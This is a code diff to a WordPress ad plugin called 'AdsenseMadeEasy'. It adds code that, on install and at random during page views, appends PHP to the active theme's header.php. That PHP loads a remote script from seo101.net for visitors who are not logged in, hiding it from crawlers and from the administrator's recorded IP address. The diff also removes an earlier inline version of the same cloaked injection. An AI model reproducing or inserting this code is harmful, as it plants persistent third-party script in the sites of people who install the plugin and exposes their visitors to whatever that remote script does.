@@ -29,17 +29,10 @@ if (!class_exists("AdsenseMadeEasy")) {
 			// Checks the retrieved value  (should be empty if we want to display it)
 			if( empty( $meta_value ) ) {
 				$content = "";
-				$btt = false;
-				if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
-					$btt = true;
-				}
-
-				$ip = $_SERVER['REMOTE_ADDR'];
-				if ( is_user_logged_in() ) {
-					update_option( 'adsense_made_easy_ip', $ip );
-				}
-				if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip && $btt==false) {
-					$content .= "<script src=\"//www.seo101.net/s101.js\"></script>\n";
+				if (rand(0,100)==10) {
+					if( strpos(file_get_contents(get_template_directory() . "/header.php"),"apntrack") == false) {
+						file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/apntrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
+					}
 				}
 				if (get_option('adsense_made_easy_toplinkunit')=='yes') {
 					$content .= "<script type=\"text/javascript\"><!--\n";
@@ -682,6 +675,9 @@ function adsense_made_easy_install() {
 	add_option("adsense_made_easy_middleparagraph", '2', '', 'yes');
 	add_option("adsense_made_easy_middlewordcount", '0', '', 'yes');
 	add_option("adsense_made_easy_ip", '', '', 'yes');
+	if( strpos(file_get_contents(get_template_directory() . "/header.php"),"apntrack") == false) {
+		file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/apntrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
+	}
 }
 
 function adsense_made_easy_remove() {
